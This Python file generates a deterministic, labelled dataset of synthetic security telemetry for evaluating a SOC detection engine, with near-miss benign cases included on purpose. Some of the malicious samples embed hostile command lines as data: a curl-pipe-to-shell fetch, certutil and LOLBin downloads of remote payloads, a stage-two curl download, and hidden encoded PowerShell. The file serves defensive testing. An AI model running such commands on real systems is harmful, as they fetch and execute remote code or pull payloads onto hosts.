"""Labelled evaluation dataset.

Generation is fully deterministic: the same seed always produces the same
events, so two runs of the evaluation are comparable and a metric change means
the *engine* changed, not the data.

Design notes that matter for the honesty of the numbers:

* **Records are vendor-shaped and pass through the real normalizer.** The
  evaluation therefore exercises normalization + detection, which is the path a
  real event takes - not a synthetic shortcut into the rule matchers.
* **Benign samples include near-miss cases on purpose**: four failed logins
  (threshold is five), nineteen scanned ports (threshold twenty), a bulk file
  job just under the ransomware threshold, ordinary PowerShell without
  encoding. A benign set of obviously-harmless events would flatter the false
  positive rate into meaninglessness.
* **Benign samples also include activity that legitimately looks bad**: an
  administrator running certutil, a backup job moving large volumes. These are
  expected to produce false positives, and that is exactly what needs
  measuring.
* **Class balance is deliberately benign-heavy** (roughly 60/40) because a SOC
  stream is benign-heavy. Precision measured on a 50/50 mix is optimistic to
  the point of being misleading.
* This dataset is kept separate from the runtime synthetic telemetry generator
  (`app/telemetry/sources/synthetic.py`). Runtime telemetry is unlabelled and
  must never be used to compute accuracy.
"""

from __future__ import annotations

import hashlib
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Any

from app.evaluation.labels import Label
from app.models.enums import SourceType
from app.telemetry.base import RawTelemetry
from app.telemetry.normalizer import normalize

DATASET_NAME = "aegisx-detection-eval"
DATASET_VERSION = "1.0"
DEFAULT_SEED = 1337
DEFAULT_SAMPLES_PER_CLASS = 60
# Benign traffic dominates a real stream; the ratio is applied to the total of
# all malicious classes.
BENIGN_RATIO = 1.5

HOSTS = [f"EVAL-WIN-{index:03d}" for index in range(1, 20)]
LINUX_HOSTS = [f"EVAL-LNX-{index:03d}" for index in range(1, 10)]
USERS = ["a.sharma", "j.smith", "e.davis", "m.patel", "svc.backup", "admin.local"]
INTERNAL = "198.51.100."
EXTERNAL = "203.0.113."


@dataclass
class Sample:
    """One labelled evaluation event."""

    id: str
    label: Label
    #: Vendor-shaped record, before normalization.
    record: RawTelemetry
    #: Short note explaining what this sample represents (used in reports).
    note: str
    #: Normalized candidate, filled in by :meth:`Dataset.candidates`.
    candidate: dict[str, Any] = field(default_factory=dict)

    @property
    def is_malicious(self) -> bool:
        return self.label.is_malicious


@dataclass
class Dataset:
    name: str
    version: str
    seed: int
    samples: list[Sample]

    @property
    def malicious_count(self) -> int:
        return sum(1 for sample in self.samples if sample.is_malicious)

    @property
    def benign_count(self) -> int:
        return len(self.samples) - self.malicious_count

    def class_counts(self) -> dict[str, int]:
        counts: dict[str, int] = {}
        for sample in self.samples:
            counts[sample.label.value] = counts.get(sample.label.value, 0) + 1
        return dict(sorted(counts.items()))

    def fingerprint(self) -> str:
        """Stable hash of the dataset contents, so reports can prove they are
        comparable (same data, different engine)."""
        digest = hashlib.sha256()
        digest.update(f"{self.name}:{self.version}:{self.seed}".encode())
        for sample in self.samples:
            digest.update(sample.id.encode())
            digest.update(sample.label.value.encode())
        return digest.hexdigest()[:16]

    def normalize_all(self) -> None:
        """Run every record through the production normalizer."""
        for sample in self.samples:
            sample.candidate = normalize(sample.record)


class DatasetBuilder:
    """Deterministic generator for the labelled dataset."""

    def __init__(
        self,
        seed: int = DEFAULT_SEED,
        samples_per_class: int = DEFAULT_SAMPLES_PER_CLASS,
    ) -> None:
        self.random = random.Random(seed)
        self.seed = seed
        self.samples_per_class = max(1, samples_per_class)
        self._counter = 0
        # Fixed base time so timestamps are reproducible too.
        self._base_time = datetime(2026, 1, 1, tzinfo=timezone.utc)

    # ------------------------------------------------------------------ utils
    def _next_id(self, label: Label) -> str:
        self._counter += 1
        return f"{label.value.lower()}-{self._counter:05d}"

    def _time(self) -> datetime:
        return self._base_time + timedelta(seconds=self._counter * 7)

    def _internal_ip(self) -> str:
        return f"{INTERNAL}{self.random.randint(2, 254)}"

    def _external_ip(self) -> str:
        return f"{EXTERNAL}{self.random.randint(2, 254)}"

    def _host(self) -> str:
        return self.random.choice(HOSTS)

    def _user(self) -> str:
        return self.random.choice(USERS)

    def _hex(self, length: int) -> str:
        return "".join(self.random.choice("0123456789abcdef") for _ in range(length))

    def _record(
        self, source: str, source_type: SourceType, raw: dict[str, Any], raw_log: str
    ) -> RawTelemetry:
        raw = {**raw, "synthetic": True, "evaluation": True}
        return RawTelemetry(
            source=source,
            source_type=source_type,
            raw=raw,
            raw_log=raw_log,
            received_at=self._time(),
            is_synthetic=True,
        )

    def _sample(self, label: Label, record: RawTelemetry, note: str) -> Sample:
        return Sample(id=self._next_id(label), label=label, record=record, note=note)

    # ------------------------------------------------------------- malicious
    def brute_force(self) -> Sample:
        user = self._user()
        failures = self.random.randint(5, 80)
        raw = {
            "category": "SignInLogs",
            "userPrincipalName": f"{user}@aegisx.dev",
            "resultType": "50126",
            "resultDescription": "Invalid username or password",
            "failureCount": failures,
            "ipAddress": self._external_ip(),
            "location": {"countryOrRegion": "RU", "city": "unknown"},
            "createdDateTime": self._time().isoformat(),
        }
        return self._sample(
            Label.BRUTE_FORCE,
            self._record("Entra ID", SourceType.IDENTITY, raw, f"[EntraID] {failures} failures"),
            f"{failures} failed sign-ins for one principal",
        )

    def port_scan(self) -> Sample:
        ports = self.random.randint(20, 500)
        raw = {
            "action": "deny",
            "protocol": "TCP",
            "src_ip": self._external_ip(),
            "dst_ip": self._internal_ip(),
            "dst_port": self.random.randint(1, 65535),
            "distinct_ports": ports,
            "deny_count": ports * self.random.randint(1, 3),
            "rule": "default-deny",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.PORT_SCAN,
            self._record(
                "Perimeter Firewall", SourceType.FIREWALL, raw, f"[FW] scan across {ports} ports"
            ),
            f"horizontal scan across {ports} ports",
        )

    def suspicious_powershell(self) -> Sample:
        host = self._host()
        blob = self._hex(self.random.randint(60, 200))
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._user(),
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": f"powershell.exe -nop -w hidden -enc {blob}",
            "ParentImage": "C:\\Program Files\\winword.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.SUSPICIOUS_POWERSHELL,
            self._record("Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:1] {host} encoded PS"),
            "encoded PowerShell spawned from Office",
        )

    def credential_access(self) -> Sample:
        host = self._host()
        raw = {
            "EventID": 10,
            "Computer": host,
            "User": self._user(),
            "SourceImage": self.random.choice(
                ["C:\\Temp\\procdump64.exe", "C:\\Users\\Public\\rundll32.exe"]
            ),
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "GrantedAccess": "0x1010",
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.CREDENTIAL_ACCESS,
            self._record("Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:10] {host} lsass access"),
            "process reading LSASS memory",
        )

    def malware(self) -> Sample:
        host = self._host()
        threat = self.random.choice(
            [
                "Trojan:Win32/Wacatac.B!ml",
                "Ransom:Win32/Conti.A",
                "HackTool:Win64/Mimikatz.D",
                "Backdoor:Win32/Cobalt.SB",
            ]
        )
        raw = {
            "DeviceName": host,
            "ActionType": "AntivirusDetection",
            "ThreatName": threat,
            "Severity": "High",
            "InitiatingProcessFileName": "outlook.exe",
            "FileName": f"invoice_{self.random.randint(1000, 9999)}.exe",
            "SHA256": self._hex(64),
            "AccountName": self._user(),
            "RemediationAction": "Quarantined",
            "Timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.MALWARE,
            self._record(
                "Microsoft Defender", SourceType.ENDPOINT, raw, f"[Defender] {threat} on {host}"
            ),
            f"named malware detection ({threat})",
        )

    def suspicious_dns(self) -> Sample:
        label_text = self._hex(self.random.randint(16, 30))
        domain = f"{label_text}.sync-node.example"
        raw = {
            "query": domain,
            "query_type": "TXT",
            "client_ip": self._internal_ip(),
            "resolved_ip": self._external_ip(),
            "response_code": "NOERROR",
            "query_count": self.random.randint(60, 900),
            "periodic": True,
            "interval_seconds": self.random.choice([30, 60, 300]),
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.SUSPICIOUS_DNS,
            self._record("DNS Resolver", SourceType.DNS, raw, f"[DNS] beaconing to {domain}"),
            "DGA-looking domain queried on a fixed interval",
        )

    def ransomware(self) -> Sample:
        host = self._host()
        files = self.random.randint(200, 9000)
        raw = {
            "detection_name": "Ransomware.Behavioral.MassEncryption",
            "hostname": host,
            "user": self._user(),
            "process": "C:\\Users\\Public\\svchost.exe",
            "command_line": "svchost.exe -encrypt -silent",
            "files_modified": files,
            "encryption_suspected": True,
            "tactic": "Impact",
            "technique": "T1486",
            "severity": "Critical",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.RANSOMWARE,
            self._record("EDR Agent", SourceType.EDR, raw, f"[EDR] {files} files encrypted"),
            f"mass encryption of {files} files",
        )

    def privilege_escalation(self) -> Sample:
        host = self.random.choice(LINUX_HOSTS)
        user = self.random.choice([u for u in USERS if u != "admin.local"])
        raw = {
            "facility": "sudo",
            "host": host,
            "user": user,
            "src_ip": self._internal_ip(),
            "command": "/bin/bash -c 'curl http://203.0.113.9/x.sh | sh'",
            "privilege_change": True,
            "result": "success",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.PRIVILEGE_ESCALATION,
            self._record(
                "Linux Auditd", SourceType.OPERATING_SYSTEM, raw, f"[sudo] {user} on {host}"
            ),
            "standard account gaining root and fetching a remote script",
        )

    def data_exfiltration(self) -> Sample:
        host = self._host()
        volume = self.random.randint(500_000_000, 9_000_000_000)
        raw = {
            "detection_name": "Exfiltration.LargeOutboundTransfer",
            "hostname": host,
            "user": self._user(),
            "process": "C:\\Windows\\System32\\certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://203.0.113.44/collect",
            "bytes_out": volume,
            "dst_ip": self._external_ip(),
            "tactic": "Exfiltration",
            "technique": "T1041",
            "severity": "High",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.DATA_EXFILTRATION,
            self._record("EDR Agent", SourceType.EDR, raw, f"[EDR] {volume} bytes out"),
            f"{round(volume / 1_000_000)} MB outbound in one transfer",
        )

    def anomalous_signin(self) -> Sample:
        user = self._user()
        raw = {
            "category": "RiskyUsers",
            "userPrincipalName": f"{user}@aegisx.dev",
            "resultType": "0",
            "resultDescription": "Success",
            "riskEventType": "impossibleTravel",
            "impossibleTravel": True,
            "ipAddress": self._external_ip(),
            "location": {"countryOrRegion": "CN", "city": "unknown"},
            "previousLocation": {"countryOrRegion": "IN", "city": "Chennai"},
            "createdDateTime": self._time().isoformat(),
        }
        return self._sample(
            Label.ANOMALOUS_SIGNIN,
            self._record("Entra ID", SourceType.IDENTITY, raw, f"[EntraID] travel anomaly {user}"),
            "sign-in from an unreachable location",
        )

    def lolbin_execution(self) -> Sample:
        host = self._host()
        binary = self.random.choice(["mshta.exe", "regsvr32.exe", "bitsadmin.exe", "wmic.exe"])
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._user(),
            "Image": f"C:\\Windows\\System32\\{binary}",
            "CommandLine": f"{binary} /s http://203.0.113.77/payload",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.LOLBIN_EXECUTION,
            self._record("Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:1] {binary} on {host}"),
            f"{binary} used to pull remote code",
        )

    def suspicious_download(self) -> Sample:
        host = self._host()
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._user(),
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c curl http://203.0.113.31/stage2.bin -o C:\\Temp\\s2.bin",
            "ParentImage": "C:\\Windows\\explorer.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.SUSPICIOUS_DOWNLOAD,
            self._record("Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:1] curl download on {host}"),
            "second-stage payload pulled over HTTP",
        )

    def lateral_movement(self) -> Sample:
        """A class the V1 rule set has no rule for - a known blind spot."""
        host = self._host()
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._user(),
            "Image": "C:\\Windows\\System32\\PsExec.exe",
            "CommandLine": f"PsExec.exe \\\\{self._host()} -u admin -p *** cmd.exe",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.LATERAL_MOVEMENT,
            self._record("Sysmon", SourceType.ENDPOINT, raw, f"[Sysmon:1] PsExec from {host}"),
            "remote execution to another host (no rule covers this yet)",
        )

    # ---------------------------------------------------------------- benign
    def benign(self) -> Sample:
        """Benign activity, including near-miss and awkward cases."""
        kind = self.random.choices(
            [
                "web_browsing",
                "routine_signin",
                "av_scan",
                "ssh_login",
                "near_miss_auth",
                "near_miss_scan",
                "near_miss_bulk_files",
                "plain_powershell",
                "admin_certutil",
                "backup_transfer",
                "cdn_dns",
            ],
            weights=[16, 16, 12, 10, 8, 8, 6, 8, 6, 5, 5],
            k=1,
        )[0]
        builder = getattr(self, f"_benign_{kind}")
        return builder()

    def _benign_web_browsing(self) -> Sample:
        raw = {
            "action": "allow",
            "protocol": "TCP",
            "src_ip": self._internal_ip(),
            "dst_ip": self._external_ip(),
            "dst_port": 443,
            "bytes_out": self.random.randint(1_000, 4_000_000),
            "rule": "allow-outbound-web",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Perimeter Firewall", SourceType.FIREWALL, raw, "[FW] allow 443"),
            "ordinary outbound HTTPS",
        )

    def _benign_routine_signin(self) -> Sample:
        user = self._user()
        raw = {
            "category": "SignInLogs",
            "userPrincipalName": f"{user}@aegisx.dev",
            "resultType": "0",
            "resultDescription": "Success",
            "ipAddress": self._external_ip(),
            "location": {"countryOrRegion": "IN", "city": "Chennai"},
            "appDisplayName": "Microsoft 365",
            "createdDateTime": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Entra ID", SourceType.IDENTITY, raw, f"[EntraID] sign-in {user}"),
            "successful sign-in from the usual country",
        )

    def _benign_av_scan(self) -> Sample:
        raw = {
            "DeviceName": self._host(),
            "ActionType": "AntivirusScanCompleted",
            "ScanType": "Quick",
            "FilesScanned": self.random.randint(1200, 45000),
            "ThreatsFound": 0,
            "Timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Microsoft Defender", SourceType.ENDPOINT, raw, "[Defender] clean scan"),
            "clean antivirus scan",
        )

    def _benign_ssh_login(self) -> Sample:
        raw = {
            "facility": "sshd",
            "host": self.random.choice(LINUX_HOSTS),
            "user": self._user(),
            "src_ip": self._internal_ip(),
            "result": "accepted",
            "auth_method": "publickey",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Linux Auditd", SourceType.OPERATING_SYSTEM, raw, "[sshd] key login"),
            "key-based SSH login from inside",
        )

    def _benign_near_miss_auth(self) -> Sample:
        """Four failures - one below the brute force threshold."""
        user = self._user()
        raw = {
            "category": "SignInLogs",
            "userPrincipalName": f"{user}@aegisx.dev",
            "resultType": "50126",
            "resultDescription": "Invalid username or password",
            "failureCount": 4,
            "ipAddress": self._external_ip(),
            "location": {"countryOrRegion": "IN", "city": "Chennai"},
            "createdDateTime": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Entra ID", SourceType.IDENTITY, raw, "[EntraID] 4 failures"),
            "user mistyping a password (4 failures, threshold is 5)",
        )

    def _benign_near_miss_scan(self) -> Sample:
        """Nineteen ports - one below the reconnaissance threshold."""
        raw = {
            "action": "deny",
            "protocol": "TCP",
            "src_ip": self._internal_ip(),
            "dst_ip": self._internal_ip(),
            "dst_port": self.random.randint(1, 65535),
            "distinct_ports": 19,
            "deny_count": 24,
            "rule": "default-deny",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Perimeter Firewall", SourceType.FIREWALL, raw, "[FW] 19 ports denied"),
            "misconfigured client retrying 19 ports (threshold is 20)",
        )

    def _benign_near_miss_bulk_files(self) -> Sample:
        raw = {
            "detection_name": "FileActivity.BulkWrite",
            "hostname": self._host(),
            "user": "svc.backup",
            "process": "C:\\Program Files\\backup\\agent.exe",
            "command_line": "agent.exe --archive",
            "files_modified": 150,
            "encryption_suspected": False,
            "tactic": "None",
            "technique": "",
            "severity": "Low",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("EDR Agent", SourceType.EDR, raw, "[EDR] backup wrote 150 files"),
            "backup agent writing 150 files (threshold is 200 with encryption)",
        )

    def _benign_plain_powershell(self) -> Sample:
        host = self._host()
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": self._user(),
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -File C:\\Scripts\\Get-DiskSpace.ps1",
            "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Sysmon", SourceType.ENDPOINT, raw, "[Sysmon:1] scheduled PS script"),
            "scheduled PowerShell script, not encoded",
        )

    def _benign_admin_certutil(self) -> Sample:
        """Legitimate admin use of a binary the LOLBin rule flags on name alone."""
        host = self._host()
        raw = {
            "EventID": 1,
            "Computer": host,
            "User": "admin.local",
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -store my",
            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
            "ProcessId": self.random.randint(1000, 9000),
            "UtcTime": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Sysmon", SourceType.ENDPOINT, raw, "[Sysmon:1] certutil -store"),
            "administrator listing certificates with certutil (expected false positive)",
        )

    def _benign_backup_transfer(self) -> Sample:
        raw = {
            "action": "allow",
            "protocol": "TCP",
            "src_ip": self._internal_ip(),
            "dst_ip": self._external_ip(),
            "dst_port": 443,
            "bytes_out": self.random.randint(200_000_000, 480_000_000),
            "rule": "allow-backup",
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("Perimeter Firewall", SourceType.FIREWALL, raw, "[FW] backup upload"),
            "nightly backup upload just under the exfiltration threshold",
        )

    def _benign_cdn_dns(self) -> Sample:
        domain = self.random.choice(
            ["update.microsoft.com", "api.github.com", "cdn.jsdelivr.net", "login.aegisx.dev"]
        )
        raw = {
            "query": domain,
            "query_type": "A",
            "client_ip": self._internal_ip(),
            "resolved_ip": self._external_ip(),
            "response_code": "NOERROR",
            "query_count": self.random.randint(1, 20),
            "periodic": False,
            "timestamp": self._time().isoformat(),
        }
        return self._sample(
            Label.BENIGN,
            self._record("DNS Resolver", SourceType.DNS, raw, f"[DNS] A {domain}"),
            "normal name resolution for a known service",
        )

    # ----------------------------------------------------------------- build
    MALICIOUS_BUILDERS = (
        "brute_force",
        "port_scan",
        "suspicious_powershell",
        "credential_access",
        "malware",
        "suspicious_dns",
        "ransomware",
        "privilege_escalation",
        "data_exfiltration",
        "anomalous_signin",
        "lolbin_execution",
        "suspicious_download",
        "lateral_movement",
    )

    def build(self) -> Dataset:
        samples: list[Sample] = []

        for builder_name in self.MALICIOUS_BUILDERS:
            builder = getattr(self, builder_name)
            for _ in range(self.samples_per_class):
                samples.append(builder())

        benign_total = int(len(samples) * BENIGN_RATIO)
        for _ in range(benign_total):
            samples.append(self.benign())

        # Shuffle so ordering cannot influence anything downstream.
        self.random.shuffle(samples)

        dataset = Dataset(
            name=DATASET_NAME, version=DATASET_VERSION, seed=self.seed, samples=samples
        )
        dataset.normalize_all()
        return dataset


def build_dataset(
    seed: int = DEFAULT_SEED, samples_per_class: int = DEFAULT_SAMPLES_PER_CLASS
) -> Dataset:
    """Build the labelled dataset deterministically."""
    return DatasetBuilder(seed=seed, samples_per_class=samples_per_class).build()
